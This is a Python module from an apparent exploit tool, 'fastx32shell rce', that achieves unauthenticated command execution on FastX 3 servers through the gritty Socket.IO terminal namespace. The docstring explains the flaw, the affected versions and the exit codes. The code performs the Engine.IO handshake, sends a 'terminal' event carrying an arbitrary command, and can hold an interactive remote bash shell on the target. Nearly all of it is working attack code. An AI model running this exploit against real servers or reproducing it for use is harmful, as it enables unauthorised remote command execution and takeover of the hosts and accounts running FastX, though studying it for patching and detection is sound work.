"""FastX 3 unauthenticated command execution over the /gritty terminal namespace.

Affected FastX 3 builds expose a web terminal over a Socket.IO namespace that is
created with no `auth` option:

    gritty.listen(socket, { autoRestart: true });

gritty.listen() treats a missing `auth` option as "admit everyone" -- it routes
every connection straight to connection(), which emits `accept`. The `terminal`
handler then prefers the client's command over the configured one:

    const command = overrides.command || options.command || getCMD({platform});
    term = pty.spawn(...stringArgv(command), { cwd, env: {...process.env, ...env} });

`overrides` is the client's `terminal` payload, so it outranks the host's
configuration, and the child runs as the account that owns the FastX service.
This path does not invoke sudo, so it is independent of whatever privilege that
account holds.

The namespace is not fixed
--------------------------

`gritty.listen()` mounts exactly one namespace, `socket.of(prefix || '/gritty')`
-- a custom `prefix` moves it rather than adding to it, so a prefixed build has
nothing at `/gritty`. Socket.IO answers a connect to an unregistered namespace
with an ERROR packet (`44<ns>,`), not with a `reject`, and that is exit 3
("nothing is mounted here"), never exit 2 ("auth is enforced"). Use
`--namespace` when the prefix is known. One quirk is worth probing anyway: the
socket side falls back with `prefix || '/gritty'` while gritty's HTTP router
uses a default argument, which only fires on `undefined`, so a build
configured with an empty-string prefix serves its assets at the root but still
mounts the socket at `/gritty`.

A gate is not proof of a check
------------------------------

Silence after the connect means an `auth` handler is registered, nothing more.
The handler runs only once the client emits `auth`, so a handler that accepts
anything is indistinguishable from one that verifies until the event is
actually sent. `--auth USER[:PASS]` sends it, as the two positional arguments
the handler expects. Treat exit 2 without `--auth` as "untested", not as
"hardened".

This costs one extra event, and that event is an authentication attempt, so it
is opt-in and never sent by default. Omitting the colon sends an empty
password.

Version scope
-------------
Affected: 3.0.41 through 3.1.27. From 3.2.27 on, builds carry the same flawed
integration, but none ships the `gritty` module, and their `socketIo()` call
receives an `undefined` argument, so no namespace is mounted anywhere. On those
builds exit 3 is the correct result, not a tool failure. FastX 5 removed
the subsystem entirely.

On 3.2.27+ the terminal also lives in `user-link`, a per-session process bound
to loopback on an ephemeral port rather than on the public web port, so --base
pointed at the public service is the wrong target shape there in any case.

Read-only by default: the command is `id` and it runs once. Nothing is written and
no session API is used. Pass --cmd deliberately. In `-i` the spawned shell runs
nothing until a line is typed; the tool still writes nothing itself.

Examples
--------
    fastx32shell rce --base https://fastx.example.com
    fastx32shell rce --base https://fastx.example.com --cmd 'id; uname -a'
    fastx32shell rce --base https://fastx.example.com --dry-run
    fastx32shell rce --base https://fastx.example.com --auth user:pass
    fastx32shell rce --base https://fastx.example.com --proxy http://127.0.0.1:8080
    fastx32shell rce --base https://fastx.example.com -i
    printf 'id; ls /tmp\n' | fastx32shell rce --base https://fastx.example.com -i

`-i` keeps one pty alive for the whole session and forwards stdin, so `cd`,
variables and pipes work like a real terminal. It is line mode: a line is sent
on Enter, and there is no tab completion or history recall (the pty echoes the
line back; a local tty already showed it typed, so that echo is stripped).
Nothing typed in answer to a password or passphrase prompt is displayed: local
echo is muted when the prompt arrives and comes back as soon as the line is
sent. `--cmd` then names the program to spawn (default `bash`) rather than a
command string, because the target splits it into argv itself.

Exit codes
    0   command executed and output returned (or --dry-run reached `accept`,
        or the interactive session ended)
    2   namespace reached but no `accept`. An auth handler is installed;
        without --auth that is the whole of what this proves
    3   no surface: either no Socket.IO handshake at all, or a handshake that
        succeeds while the namespace itself is unregistered
    4   transport error, or accepted but the command produced no output
    64  usage error
"""

import json
import shutil
import signal
import sys
import threading
import time

from fastx32shell import http
from fastx32shell.engineio import (DEFAULT_PING_INTERVAL, Client, Pinger, frame,
                            namespace_error, poll_once, send_event)
from fastx32shell.term import (EchoStripper, LocalEcho, SecretPromptWatcher,
                               safe_text)

DEFAULT_NAMESPACE = "/gritty"

# A transport error inside the poll loop retries rather than aborting, because a
# single dropped poll is common through an intercepting proxy. Without a pause,
# an instant failure (connection refused) would spin the loop until the deadline.
POLL_ERROR_BACKOFF = 0.5

# How long stdin EOF waits for the pty to die once its output stops arriving.
# In interactive mode EOF sends Ctrl-D to the pty, then this drain window; an
# immediate disconnect would race the last command's output off the wire.
EOF_DRAIN_TIMEOUT = 2.0


def run_interactive(cl, poll, ns, args, log):
    """Drive the live pty: poll on this thread, stdin on its own.

    The reader thread gets its own Client, so a long-poll held open by the
    server never delays a line being typed. Ctrl-D sends a ^D to the pty and
    waits for it to die rather than disconnecting at once: a disconnect kills
    the pty, and the last command's output would go with it.
    """
    tty = sys.stdin.isatty()
    stripper = EchoStripper()
    watcher = SecretPromptWatcher(LocalEcho(sys.stdin)) if tty else None
    eof = threading.Event()
    interrupt = threading.Event()
    closing = threading.Event()
    sender = Client(args.base, args.timeout, args.insecure, args.proxy,
                    args.ca, args.cookie, args.ua or http.DEFAULT_UA)
    interrupter = Client(args.base, args.timeout, args.insecure, args.proxy,
                         args.ca, args.cookie, args.ua or http.DEFAULT_UA)

    def reader():
        try:
            while not eof.is_set():
                line = sys.stdin.readline()
                if line == "":
                    send_event(sender, poll, ns, "data", "\x04")
                    eof.set()
                    return
                line = line.rstrip("\r\n")
                if tty:
                    stripper.arm(line)
                send_event(sender, poll, ns, "data", line + "\n")
                if watcher is not None:
                    # The line is on the wire, so the secret is no longer being
                    # typed: give the operator their echo back before the pty
                    # prints anything else.
                    watcher.reset()
                    watcher.echo.restore()
        except (OSError, ValueError):
            # A dead stdin is an EOF, not a reason to wedge the session.
            send_event(sender, poll, ns, "data", "\x04")
            eof.set()

    def on_interrupt():
        """Forward Ctrl-C off the polling thread.

        Raising KeyboardInterrupt inside the long poll aborts the request, and
        the server treats the dropped connection as a disconnect: the session
        is gone before the ^C is sent. A handler that only sets a flag leaves
        the interrupted request to be retried (PEP 475), so the poll survives
        and this thread does the sending.
        """
        while True:
            interrupt.wait()
            interrupt.clear()
            if closing.is_set():
                return
            # A secret being typed is abandoned: a terminal left in no-echo is
            # worse than a half-typed command line on the target.
            if watcher is not None:
                watcher.reset()
                watcher.echo.restore()
            send_event(interrupter, poll, ns, "data", "\x03")

    previous_handler = None
    if threading.current_thread() is threading.main_thread():
        try:
            previous_handler = signal.getsignal(signal.SIGINT)
            signal.signal(signal.SIGINT, lambda *_: interrupt.set())
        except (OSError, ValueError):       # no signals here; fall back below
            previous_handler = None

    threading.Thread(target=reader, daemon=True).start()
    threading.Thread(target=on_interrupt, daemon=True).start()

    last_data = time.time()
    try:
        while True:
            if eof.is_set() and time.time() - last_data > EOF_DRAIN_TIMEOUT:
                log("stdin closed and the pty stopped answering; disconnecting")
                return
            try:
                status, events, body = poll_once(cl, poll, ns)
                if status is None:
                    time.sleep(POLL_ERROR_BACKOFF)
                    continue
                if status != 200:
                    log("poll ->", status, body[:100])
                    return

                for event, rest in events:
                    if event == "data":
                        chunk = rest[0] if rest and isinstance(rest[0], str) else ""
                        if tty:
                            chunk = stripper.feed(chunk)
                        if chunk:
                            last_data = time.time()
                            # Mute before printing: the prompt is the last
                            # thing the operator sees before typing, so the
                            # echo must be off by the time it is on screen.
                            if watcher is not None:
                                watcher.feed(chunk)
                            sys.stdout.write(chunk)
                            sys.stdout.flush()
                    elif event == "exit":
                        log("remote shell exited (%s)"
                            % (rest[0] if rest else "?"))
                        return
                    elif event == "reject":
                        log("`reject`: the session stopped being accepted")
                        return
            except KeyboardInterrupt:
                # Only reached where the handler above could not be installed.
                interrupt.set()
    finally:
        closing.set()
        interrupt.set()                     # wake the forwarder so it exits
        if previous_handler is not None:
            signal.signal(signal.SIGINT, previous_handler)
        # Every way out of the session -- remote exit, reject, transport error,
        # EOF drain, or an exception -- hands the terminal back with echo on.
        if watcher is not None:
            watcher.reset()
            watcher.echo.restore()


def add_arguments(parser):
    parser.add_argument("--base", required=True,
                        help="target base URL, e.g. https://fastx.example.com[:port]")
    parser.add_argument("-i", "--interactive", action="store_true",
                        help="keep one pty running and forward stdin (line mode)")
    parser.add_argument("--cmd", default=None,
                        help="command string to run (default: id; bash with -i)")
    parser.add_argument("--namespace", default=DEFAULT_NAMESPACE,
                        help="Socket.IO namespace (default: %s)" % DEFAULT_NAMESPACE)
    parser.add_argument("--auth", default=None, metavar="USER[:PASS]",
                        help="send an `auth` event with these credentials "
                             "before expecting `accept`; use when a namespace "
                             "answers the connect with silence")
    parser.add_argument("--cwd", default=None,
                        help="working directory for the spawned process")
    parser.add_argument("--cookie", default="",
                        help="Cookie header value; usually unnecessary")
    parser.add_argument("--dry-run", action="store_true",
                        help="stop at `accept`, never send a command")
    parser.add_argument("--accept-timeout", type=float, default=8.0,
                        help="seconds to wait for `accept`")
    parser.add_argument("--run-timeout", type=float, default=40.0,
                        help="seconds to wait for output after sending a command")
    parser.add_argument("--dry-run-timeout", type=float, default=8.0,
                        help="seconds to wait for `accept` in --dry-run")
    parser.set_defaults(_parser=parser)


def run(args):
    if args.interactive and args.dry_run:
        args._parser.error("--interactive cannot be combined with --dry-run")
    if args.cmd is None:
        args.cmd = "bash" if args.interactive else "id"

    t0 = time.time()

    def log(*a):
        print("[%5.2fs]" % (time.time() - t0), *a, flush=True)

    cl = Client(args.base, args.timeout, args.insecure, args.proxy,
                args.ca, args.cookie, args.ua or http.DEFAULT_UA)
    ns = args.namespace

    stamp = int(time.time() * 1000)
    status, body = cl.call("%s/socket.io/?EIO=3&transport=polling&t=h%d"
                           % (cl.base, stamp))
    if status != 200 or "sid" not in body:
        log("handshake ->", status, body[:120])
        log("no Socket.IO handshake: the terminal transport is absent, "
            "or this build does not mount it")
        return 3

    try:
        opening = json.loads(body[body.find("{"):body.rfind("}") + 1])
        sid = opening["sid"]
    except (ValueError, KeyError) as e:
        log("handshake body did not parse as Engine.IO JSON (%s): %s"
            % (type(e).__name__, body[:120]))
        return 3
    poll = "%s/socket.io/?EIO=3&transport=polling&sid=%s" % (cl.base, sid)

    # pingInterval is a client obligation in v3: miss it and the session is
    # reaped mid-command. A handshake without one gets the protocol default.
    try:
        ping_interval = float(opening["pingInterval"]) / 1000.0
    except (KeyError, TypeError, ValueError):
        ping_interval = DEFAULT_PING_INTERVAL

    log("sid", sid,
        "| proxy:", args.proxy or "none",
        "| cookie:", "yes" if args.cookie else "NO",
        "| namespace:", ns,
        "| command:", args.cmd,
        "| dry-run:", args.dry_run)

    status, reply = cl.call(poll + "&t=c%d" % stamp, "POST",
                            frame("40" + ns + ","))
    log("connect %s ->" % ns, status, repr(reply[:60]))
    if status != 200:
        log("namespace connect refused by the transport")
        return 4

    if args.auth is not None:
        user, _, password = args.auth.partition(":")
        status = send_event(cl, poll, ns, "auth", user, password)
        log("sent auth as %r ->" % user, status)

    pinger = Pinger(
        Client(args.base, args.timeout, args.insecure, args.proxy,
               args.ca, args.cookie, args.ua or http.DEFAULT_UA),
        poll, ping_interval).start()

    accepted = False
    nsp_absent = False
    collected = []
    deadline = time.time() + (args.dry_run_timeout if args.dry_run
                              else args.run_timeout)
    sent = False

    while time.time() < deadline:
        status, events, body = poll_once(cl, poll, ns)
        if status is None:
            time.sleep(POLL_ERROR_BACKOFF)
            continue
        if status != 200:
            log("poll ->", status, body[:100])
            break

        reason = namespace_error(body, ns)
        if reason is not None:
            log("`%s`: no namespace is registered at %s"
                % (safe_text(reason), ns))
            log("gritty mounts one namespace only; a build that sets a custom"
                " `prefix` leaves nothing here. Retry with --namespace.")
            nsp_absent = True
            break

        for event, rest in events:
            if event == "accept" and not accepted:
                accepted = True
                if args.dry_run:
                    log("dry-run: reached `accept`, not sending a command")
                    deadline = 0
                    break
                msg = {"command": args.cmd, "cols": 80, "rows": 24,
                       "autoRestart": False}
                if args.interactive:
                    size = shutil.get_terminal_size((80, 24))
                    msg["cols"], msg["rows"] = size.columns, size.lines
                if args.cwd:
                    msg["cwd"] = args.cwd
                status = send_event(cl, poll, ns, "terminal", msg)
                sent = True
                log("sent terminal ->", status)
                if args.interactive:
                    run_interactive(cl, poll, ns, args, log)
                    deadline = 0
                    break

            elif event == "reject":
                log("`reject`: an auth handler is installed on this namespace")
                deadline = 0
                break

            elif event == "data":
                collected.append(rest[0] if rest else "")

            elif event == "exit":
                log("exit code", rest)
                deadline = 0
                break

        if not accepted and time.time() > t0 + args.accept_timeout:
            log("no `accept` within %.0fs" % args.accept_timeout)
            break

    output = "".join(collected)
    if output:
        print("--- command output ---")
        print(output)
        print("--- end ---")

    pinger.stop()
    cl.call(poll + "&t=d%d" % int(time.time() * 1000), "POST",
            frame("41" + ns + ","))                     # disconnect -> pty killed
    log("disconnected; done")

    if nsp_absent:
        return 3                      # nothing mounted here, same as no surface
    if not accepted:
        if args.auth is None:
            log("namespace reachable but never accepted: an auth handler is"
                " installed. Whether it checks anything is untested; a handler"
                " that accepts any credentials looks identical from here."
                " Retry with --auth to settle it.")
        else:
            log("namespace reachable but not accepted: the credentials"
                " supplied to --auth were refused")
        return 2
    if args.dry_run:
        return 0                      # reaching `accept` is the whole result
    if args.interactive:
        return 0                      # the session ran; its exit code is not ours
    if not sent:
        log("accepted but the terminal event was never sent")
        return 4
    if not output:
        log("command sent and accepted, but no output came back before the "
            "run timeout; raise --run-timeout or check the command")
        return 4
    return 0
